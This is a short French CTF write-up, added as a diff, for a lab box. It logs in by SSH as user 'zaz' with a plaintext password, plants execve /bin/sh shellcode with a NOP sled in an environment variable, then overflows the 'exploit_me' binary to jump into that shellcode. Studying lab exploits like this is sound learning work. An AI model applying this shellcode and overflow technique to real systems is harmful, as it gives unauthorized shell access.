@@ -1,1 +1,46 @@
-* buffer overflow avec shell dans une variable d'environnement
+# Writeup3
+
+## Buffer overflow avec shell dans une variable d'environnement
+
+1. Définir la variable d'environnement : L'attaquant place le shellcode dans une variable d'environnement.
+
+2. Déclencher le buffer overflow exploitation de la vulnérabilité de buffer overflow dans le programme cible pour rediriger l'exécution vers le shellcode stocké dans la variable d'environnement.
+
+3. Exécution du shellcode : Une fois le shellcode exécuté, il ouvre un shell, donnant à l'attaquant un accès à la ligne de commande sur le système cible.
+
+### 1. Connexion à l'utilisateur ZAZ
+* `ssh zaz@192.168.56.101`
+
+* zaz:646da671ca01bb5d84dbb5fb2238dc8e
+
+
+### 2. SHELLCODE dans variable d'environnement
+
+* On définit la variable d'environnement on place le shellcode (code qui ouvre un shell) dans une variable d'environnement. 
+
+```sh
+export SHELLCODE=`python -c "print '\x90' * 500 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
+```
+
+ 
+### 3. Payload 
+* Adresse de la variable d'environnement SHELLCOODE à détecter avec notre code c :  
+
+ADRESSE_DU_SHELLCODE = ./find_env_adress SHELLCODE -> exemple 0xbffff8b8
+
+En little endian : 0xbffff8b8 = \xb8\xf8\xff\xbf 
+
+```sh
+export SHELLCODE=`python -c "print '\x90' * 500 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"`
+
+gdb ./exploit_me
+b *main+6
+r
+x/300s environ
+
+
+./exploit_me $(python -c 'print("\x90" * 140 + "[ADRESSE_DU_SHELLCODE]")')
+```
+
+
+* https://beta.hackndo.com/buffer-overflow/
